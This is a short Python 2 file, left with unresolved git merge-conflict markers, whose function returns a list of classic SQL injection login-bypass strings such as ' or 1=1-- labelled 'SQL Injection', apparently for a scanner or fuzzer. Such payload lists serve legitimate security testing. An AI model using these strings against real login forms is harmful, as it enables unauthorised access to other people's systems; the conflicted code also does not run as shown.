<<<<<<< HEAD
def get_all():
	sql_list = ["' or '1=1","'admin'or 1=1 or ''='", "'=1\' or \'1\' = \'1\'", "'1 'or' 1 '=' 1", "'or 1=1#", "'0 'or' 0 '=' 0", "'admin'or 1=1 or ''='", "'admin' or 1=1", "'admin' or '1'='1", "' or 1=1/*", "' or 1=1--"]

	
	all_list = [(item, "SQL Injection") for item in sql_list]
	return all_list


if __name__ == "__main__":	
	print	get_all()
=======
import requests

def get_all():
	payloads = ["' or '1=1","'admin'or 1=1 or ''='", "'=1\' or \'1\' = \'1\'", "'1 'or' 1 '=' 1", "'or 1=1#", "'0 'or' 0 '=' 0", "'admin'or 1=1 or ''='", "'admin' or 1=1", "'admin' or '1'='1", "' or 1=1/*", "' or 1=1--"]

	payloads = [(item, "SQL Injection") for item in payloads]
	return payloads
	
if __name__ == "__main__":	
	print get_all()
>>>>>>> 669c0ea0e52f1df17b05ac18fa200824b7af1dc3
